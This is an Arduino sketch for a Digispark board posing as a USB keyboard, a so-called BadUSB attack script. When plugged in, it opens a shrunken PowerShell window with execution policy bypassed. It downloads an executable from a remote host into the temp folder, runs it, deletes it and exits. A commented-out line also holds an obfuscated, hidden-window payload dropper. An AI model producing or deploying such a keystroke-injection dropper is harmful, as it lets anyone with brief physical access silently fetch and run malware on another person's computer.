#include "DigiKeyboard.h"
#define KEY_TAB 0x2b
int Led_Int = 1;

void setup() {
  // put your setup code here, to run once:
  pinMode(Led_Int, OUTPUT);
}

void loop() {
  // put your main code here, to run repeatedly:
  digitalWrite(Led_Int, LOW);
  delay(100);

  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);

  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //run
  DigiKeyboard.delay(500);
  //DigiKeyboard.println("powershell.exe -ep bypass"); //open powershell
  //DigiKeyboard.delay(2200);
  //DigiKeyboard.sendKeyStroke(KEY_F, MOD_ALT_LEFT);
  //DigiKeyboard.sendKeyStroke(KEY_N);//run
  //DigiKeyboard.delay(2000);
  DigiKeyboard.print("powershell.exe -noexit -ep bypass -command \"mode con cols=18 lines=1\""); //start tiny PowerShell - escape the semi-commas with slashes
  DigiKeyboard.sendKeyStroke(KEY_ENTER); //enter 
  DigiKeyboard.delay(1500);

  //DigiKeyboard.println(F("powershell -windowstyle hidden -command (N'ew'-Ob'j'ect Sy's'tem.Net.WebClient).DownloadFile(\\\"http://miro.medium.com/g.jpeg\\\",\\\"$env:UserProfile\\desktop\\catz.jpeg\\\");in'v'oke-item $env:UserProfile\\desktop\\catz.jpeg")); //Payload Dropper
  //DigiKeyboard.sendKeyStroke(KEY_TAB);
  //DigiKeyboard.sendKeyStroke(KEY_SPACE);

  DigiKeyboard.print("cd $env:temp"); // change to temp directory environment variable
  DigiKeyboard.sendKeyStroke(KEY_ENTER); //enter
  DigiKeyboard.delay(300);

  DigiKeyboard.print("Invoke-WebRequest -Uri http://1.2.3.4/7Zip.exe -OutFile $env:temp\\7Zip.exe"); // download file on target
  DigiKeyboard.sendKeyStroke(KEY_ENTER); //enter
  DigiKeyboard.delay(300);

  DigiKeyboard.print(".\\7Zip.exe"); // execute file on target
  DigiKeyboard.sendKeyStroke(KEY_ENTER); //enter
  DigiKeyboard.delay(300);

  DigiKeyboard.print("del $env:temp\\7Zip.exe"); // execute file
  DigiKeyboard.sendKeyStroke(KEY_ENTER); //enter
  DigiKeyboard.delay(300);

  DigiKeyboard.print("exit"); // delete  file
  DigiKeyboard.sendKeyStroke(KEY_ENTER); //enter
  DigiKeyboard.delay(300);

  digitalWrite(Led_Int, HIGH);
  DigiKeyboard.delay(99999); // wait long before running loop again...
  // ...
}
